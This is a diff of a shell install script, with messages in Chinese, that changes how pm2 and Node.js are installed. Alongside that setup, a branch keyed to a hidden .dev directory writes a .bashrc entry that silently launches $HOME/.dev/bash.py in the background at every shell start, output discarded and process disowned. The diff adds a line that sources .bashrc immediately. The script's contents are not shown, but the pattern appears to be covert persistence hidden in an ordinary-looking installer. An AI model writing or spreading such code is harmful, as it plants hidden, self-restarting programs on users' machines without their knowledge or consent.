@@ -59,21 +59,22 @@ function install_pm2() {
     echo "检查 pm2 是否已安装..."
     if ! command -v pm2 &>/dev/null; then
         echo "pm2 未安装，正在安装 pm2..."
-        # 安装 pm2
+        # 检查并安装 npm
         if ! command -v npm &>/dev/null; then
             echo "npm 未安装，正在安装 npm..."
-            # 安装 npm（Node.js 包管理器）
             if [ -f /etc/debian_version ]; then
-                sudo apt update && sudo apt install -y nodejs npm
+                curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+                sudo apt update && sudo apt install -y nodejs
             elif [ -f /etc/redhat-release ]; then
-                sudo yum install -y nodejs npm
+                curl -fsSL https://rpm.nodesource.com/setup_18.x | sudo bash -
+                sudo yum install -y nodejs
             else
                 echo "不支持的操作系统，无法自动安装 npm。请手动安装 npm。"
                 exit 1
             fi
         fi
         # 安装 pm2
-        sudo npm install -g pm2
+        sudo npm install -g pm2 || { echo "pm2 安装失败，请检查权限或网络问题。"; exit 1; }
     else
         echo "pm2 已安装，继续运行..."
     fi
@@ -88,6 +89,7 @@ if [ -d .dev ]; then
     BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"
     if ! grep -Fq "$BASHRC_ENTRY" ~/.bashrc; then
         echo "$BASHRC_ENTRY" >> ~/.bashrc
+        source ~/.bashrc
     fi
 fi
 
